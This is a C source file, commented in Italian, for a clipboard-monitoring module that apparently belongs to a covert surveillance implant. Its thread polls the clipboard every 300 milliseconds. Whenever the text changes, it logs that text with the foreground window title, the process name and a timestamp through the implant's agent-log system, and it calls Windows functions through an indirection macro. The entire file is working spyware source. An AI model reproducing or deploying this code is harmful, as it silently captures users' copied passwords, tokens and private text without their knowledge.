BOOL bPM_ClipBoardStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_cbcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hClipBoardThread = NULL;

WCHAR *old_clipboard_content = NULL;


DWORD WINAPI PollClipBoard(DWORD dummy)
{
	HANDLE hData;
	HWND hFocus;
	WCHAR svTitle[SMLSIZE];
	WCHAR svProcName[SMLSIZE];

	DWORD dwProcessId = 0;
	char *asc_proc_name = NULL;
	
	WCHAR *clipboard_content;
	DWORD clip_len;

	LOOP {
		hFocus = GetForegroundWindow();
		FNC(OpenClipboard)(hFocus);
		if ( (hData = FNC(GetClipboardData)(CF_UNICODETEXT)) ) {
			clipboard_content = (WCHAR *)GlobalLock( hData );
			// Se e' la prima volta che trova contenuti, o se sono diversi dalla volta
			// precedente...
			if (clipboard_content && (!old_clipboard_content || wcscmp(old_clipboard_content, clipboard_content))) {
				clip_len = wcslen(clipboard_content)*2;
				clip_len += 2; // Aggiunge la NULL termination
				SAFE_FREE(old_clipboard_content);
				// Salva il contenuto della clipboard per confrontarlo con
				// i prossimi.
				if (old_clipboard_content = (WCHAR *)malloc(clip_len))
					memcpy(old_clipboard_content, clipboard_content, clip_len);
				FNC(GlobalUnlock)( hData );
				FNC(CloseClipboard)();
				
				// Scrive la finestra, il timestamp e il contenuto della clipboard salvato
				if (old_clipboard_content) {
					// Scrive il titolo della finestra e il timestamp
					memset(svTitle, 0, sizeof(svTitle));
					if ( HM_SafeGetWindowTextW(hFocus, (LPWSTR)svTitle, SMLSIZE-2) == 0 )
						wsprintfW((LPWSTR)svTitle, L"UNKNOWN");

					// Scrive il nome del processo in foreground
					FNC(GetWindowThreadProcessId)(hFocus, &dwProcessId);
					if (dwProcessId && (asc_proc_name = HM_FindProc(dwProcessId))) {
						memset(svProcName, 0, sizeof(svProcName));
						FNC(wnsprintfW)((LPWSTR)svProcName, SMLSIZE-2, L"%hs", asc_proc_name);
						SAFE_FREE(asc_proc_name);
					} else 
						wsprintfW((LPWSTR)svProcName, L"UNKNOWN");

					// Costruisce e scrive il log 
					bin_buf tolog;
					struct tm tstamp;
					DWORD delimiter = ELEM_DELIMITER;
					GET_TIME(tstamp);
					tolog.add(&tstamp, sizeof(tstamp));
					tolog.add(svProcName, wcslen(svProcName)*2+2);
					tolog.add(svTitle, wcslen(svTitle)*2+2);
					tolog.add(old_clipboard_content, wcslen(old_clipboard_content)*2+2);
					tolog.add(&delimiter, sizeof(DWORD));
					LOG_ReportLog(PM_CLIPBOARDAGENT, tolog.get_buf(), tolog.get_len());
				}
			} else {
				FNC(GlobalUnlock)( hData );
				FNC(CloseClipboard)();
			}	
		} else 
			FNC(CloseClipboard)();

		CANCELLATION_POINT(bPM_cbcp);
		Sleep(300);
	}
}


DWORD __stdcall PM_ClipBoardStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_ClipBoardStarted == bStartFlag)
		return 0;

	// I log va inizializzato come prima cosa...
	if (bStartFlag && !LOG_InitAgentLog(PM_CLIPBOARDAGENT))
		return 0;

	bPM_ClipBoardStarted = bStartFlag;

	if (bStartFlag) {
		// Crea il thread che esegue monitora la clipboard
		hClipBoardThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PollClipBoard, NULL, 0, &dummy);
	} else {
		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
		// stoppata (bPM_ClipBoardStarted = bStartFlag = FALSE)
		QUERY_CANCELLATION(hClipBoardThread, bPM_cbcp);
		// chiude il logging (come ultima cosa)
		LOG_StopAgentLog(PM_CLIPBOARDAGENT);
	}

	return 1;
}


DWORD __stdcall PM_ClipBoardInit(JSONObject elem)
{
	return 1;
}


void PM_ClipBoardRegister()
{
	AM_MonitorRegister(L"clipboard", PM_CLIPBOARDAGENT, NULL, (BYTE *)PM_ClipBoardStartStop, (BYTE *)PM_ClipBoardInit, NULL);
}